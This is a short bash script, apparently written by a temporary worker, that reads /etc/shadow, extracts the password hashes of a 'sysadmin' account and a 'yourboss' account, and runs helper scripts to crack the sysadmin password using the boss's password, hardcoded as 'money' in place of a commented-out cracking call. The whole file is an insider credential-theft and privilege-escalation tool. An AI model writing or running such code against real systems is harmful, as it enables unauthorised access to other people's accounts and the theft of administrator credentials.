#!/usr/bin/env bash

 temp_password="correctbatteryhorsestaple99"

# Parse the shadow password file
 while IFS= read -r line; do
	if [ "${line:0:8}" = "sysadmin" ]; then
		sysadmin_hash=$line
	elif [ "${line:0:8}" = "yourboss" ]; then 
		yourboss_hash=$line
	fi
 done < /etc/shadow

# Crack the boss' password using custom method
# TODO: replaced yourboss_cracked with actual password for testing
# ./crack_password.py "$yourboss_hash" > temp.txt
 yourboss_cracked="money"
# $(<temp.txt)
# echo $yourboss_cracked

# Format sysadmin's password hash
 ./format_password.py "$sysadmin_hash" > temp_hash.txt
 ./auth.sh crack_sysadmin.sh $yourboss_cracked
 ./auth.sh show_sysadmin.sh $yourboss_cracked
# sysadmin_cracked=$(</tmp/cracked_sysadmin1.txt)
# /home/tempworker/cracked_sysadmin1.txt
# echo $sysadmin_cracked

# Cleanup 
# rm temp.txt
# rm temp_hash.txt
# ./auth.sh cleanup.sh $yourboss_cracked

